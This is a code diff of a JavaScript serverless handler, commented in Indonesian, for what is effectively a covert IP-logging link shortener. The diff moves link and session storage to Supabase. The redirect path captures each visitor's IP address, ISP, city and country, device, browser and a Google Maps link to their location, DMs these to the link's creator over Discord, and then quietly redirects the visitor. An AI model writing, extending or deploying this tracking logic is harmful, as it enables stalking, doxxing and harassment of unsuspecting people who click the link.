@@ -1,5 +1,6 @@
-global.linkDatabase = global.linkDatabase || {}; 
+import { createClient } from '@supabase/supabase-js';
 
+const supabase = createClient(process.env.SUPABASE_URL, process.env.SUPABASE_KEY);
 const DISCORD_BOT_TOKEN = process.env.DISCORD_BOT_TOKEN;
 
 export default async function handler(req, res) {
@@ -11,17 +12,32 @@ export default async function handler(req, res) {
       return res.status(400).json({ error: 'Data tidak lengkap / Belum Login!' });
     }
 
-    const userSession = global.userSessions ? global.userSessions[session] : null;
-    if (!userSession) {
-      return res.status(401).json({ error: 'Sesi login tidak valid. Silakan re-login!' });
+    // Cek Sesi User dari Supabase
+    const { data: userSession, error: sessionErr } = await supabase
+      .from('sessions')
+      .select('user_id')
+      .eq('session_token', session)
+      .single();
+
+    if (sessionErr || !userSession) {
+      return res.status(401).json({ error: 'Sesi login tidak valid / kedaluwarsa. Silakan re-login!' });
     }
 
     const shortId = Math.random().toString(36).substring(2, 6);
+    const formattedTarget = target.startsWith('http') ? target : `https://${target}`;
 
-    global.linkDatabase[shortId] = {
-      target: target.startsWith('http') ? target : `https://${target}`,
-      userId: userSession.id
-    };
+    // Simpan Link ke Supabase
+    const { error: insertErr } = await supabase
+      .from('links')
+      .insert([{
+        short_id: shortId,
+        target_url: formattedTarget,
+        user_id: userSession.user_id
+      }]);
+
+    if (insertErr) {
+      return res.status(500).json({ error: 'Gagal menyimpan data link.' });
+    }
 
     return res.status(200).json({
       status: 'success',
@@ -31,8 +47,14 @@ export default async function handler(req, res) {
 
   // 2. REDIRECT ENGINE & DISCORD DM LOG
   if (id) {
-    const linkData = global.linkDatabase[id];
-    if (!linkData) return res.redirect(302, 'https://google.com');
+    // Ambil Data Link dari Supabase
+    const { data: linkData, error: linkErr } = await supabase
+      .from('links')
+      .select('*')
+      .eq('short_id', id)
+      .single();
+
+    if (linkErr || !linkData) return res.redirect(302, 'https://google.com');
 
     // Tangkap IP & Info Device Target
     const forwarded = req.headers['x-forwarded-for'];
@@ -70,19 +92,19 @@ export default async function handler(req, res) {
     const mapLink = (geoData.lat && geoData.lon) ? `https://www.google.com/maps?q=${geoData.lat},${geoData.lon}` : 'N/A';
 
     // Kirim DM Discord
-    if (linkData.userId && DISCORD_BOT_TOKEN) {
-      await sendDiscordDM(linkData.userId, {
+    if (linkData.user_id && DISCORD_BOT_TOKEN) {
+      await sendDiscordDM(linkData.user_id, {
         ip,
         org: geoData.org,
         location: `${geoData.city}, ${geoData.region}, ${geoData.country}`,
         device: deviceType,
         browser: browserName,
-        target: linkData.target,
+        target: linkData.target_url,
         mapLink
       });
     }
 
-    return res.redirect(302, linkData.target);
+    return res.redirect(302, linkData.target_url);
   }
 
   return res.status(400).json({ error: 'Bad Request' });
